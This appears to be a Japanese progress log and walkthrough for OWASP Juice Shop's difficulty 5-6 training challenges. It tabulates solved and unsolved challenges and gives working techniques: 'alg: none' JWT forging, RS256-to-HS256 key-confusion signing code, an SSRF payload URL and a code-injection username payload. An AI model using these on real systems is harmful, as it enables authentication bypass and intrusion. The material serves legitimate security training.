# 難易度5-6 チャレンジ (15/40 解決)

エキスパートレベル: JWT操作、2要素認証バイパス、SSRF、SSTi など高度な攻撃を学びます。

## 進捗

| 状態 | 数 |
|------|-----|
| ✅ 解決済み | 15 |
| ❌ 未解決 | 25 |

## 解決済みチャレンジ

### 難易度5 ✅ (13問)

| チャレンジ | カテゴリ | 攻略法 |
|-----------|---------|--------|
| Unsigned JWT | 認証 | `alg: none` でJWT署名バイパス |
| Two Factor Authentication | 認証 | SQLiでTOTP秘密鍵を抽出し、TOTPコード生成 |
| Change Bender's Password | 認証 | `current`パラメータ省略でパスワード変更 |
| Blockchain Hype | 隠蔽 | `/#/tokensale-ico-ea` にアクセス |
| Extra Language | 自動化 | `/assets/i18n/tlh_AA.json` (クリンゴン語) |
| Retrieve Blueprint | 情報漏洩 | `/assets/public/images/products/JuiceShop.stl` |
| Kill Chatbot | コンポーネント | ユーザー名にコードインジェクション |
| Frontend Typosquatting | コンポーネント | `ngy-cookie`をフィードバックで報告 |
| Leaked API Key | 情報漏洩 | APIキーをフィードバックで報告 |
| Leaked Access Logs | 情報漏洩 | 漏洩したログから認証情報を使用 |
| Supply Chain Attack | コンポーネント | `eslint-scope/issues/39`をフィードバックで報告 |
| Reset Morty's Password | Anti Automation | セキュリティ質問の答え: `5N0wb41L` |
| Cross-Site Imaging | 設定不備 | deluxe-membershipのtestDecalパラメータ悪用 |

### 難易度6 ✅ (2問)

| チャレンジ | カテゴリ | 攻略法 |
|-----------|---------|--------|
| Forged Coupon | 暗号 | `JAN26-80`をZ85エンコード |
| SSRF | アクセス制御 | プロフィール画像URLにSSRFペイロード |

## 未解決チャレンジ

### 難易度5 ❌

| チャレンジ | カテゴリ | ヒント |
|-----------|---------|--------|
| Blocked RCE DoS | デシリアライゼーション | Docker環境では無効 |
| XXE DoS | XXE | Billion Laughs攻撃 |
| NoSQL Exfiltration | NoSQLi | データ抽出 |
| Email Leak | 情報漏洩 | メールアドレス漏洩 |
| Reset Bjoern's Password | 認証 | OAuth設定必要 |
| Memory Bomb | デシリアライゼーション | メモリ爆弾 |
| Local File Read | コンポーネント | ローカルファイル読み取り |

### 難易度6 ❌

| チャレンジ | カテゴリ | ヒント |
|-----------|---------|--------|
| Arbitrary File Write | Zip Slip | Docker環境では無効 |
| SSTi | テンプレートインジェクション | `#{process.env}` |
| Forged Signed JWT | JWT | RS256→HS256混乱攻撃 |
| Video XSS | XSS | VTTファイルにXSS |
| Login Support Team | SQLi | サポートチームログイン |
| Multiple Likes | 自動化 | 複数いいね |
| Premium Paywall | 暗号 | プレミアムペイウォール |
| Imaginary Challenge | 暗号 | 架空のチャレンジ |
| Wallet Depletion | その他 | ウォレット枯渇 |
| Successful RCE DoS | デシリアライゼーション | Docker環境では無効 |

## 高度なテクニック

### JWT操作

```bash
# ヘッダー (alg: none)
echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr '+/' '-_' | tr -d '='

# ペイロード
echo -n '{"email":"jwtn3d@juice-sh.op"}' | base64 | tr '+/' '-_' | tr -d '='

# トークン: <header>.<payload>.
```

### アルゴリズム混乱攻撃 (RS256 → HS256)

```javascript
const jwt = require('jsonwebtoken');
const publicKey = fs.readFileSync('jwt.pub');
const token = jwt.sign({
  data: { email: 'rsa_lord@juice-sh.op' }
}, publicKey, { algorithm: 'HS256' });
```

### Z85エンコーディング

```
クーポン形式: MMMYY-XX
例: JAN26-90 → Z85エンコード
https://cryptii.com/pipes/z85-encoder
```

### SSRF ペイロード

```
http://localhost:3000/solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3
```

### Kill Chatbot ペイロード

```javascript
// プロフィールのユーザー名に設定
'admin"); processQuery=null; users.addUser("1337", "test'
```

## 環境依存チャレンジ

| チャレンジ | 必要条件 |
|-----------|---------|
| Blocked RCE DoS | ローカル Node.js (Dockerでは無効) |
| Reset Bjoern's Password | OAuth 設定 |
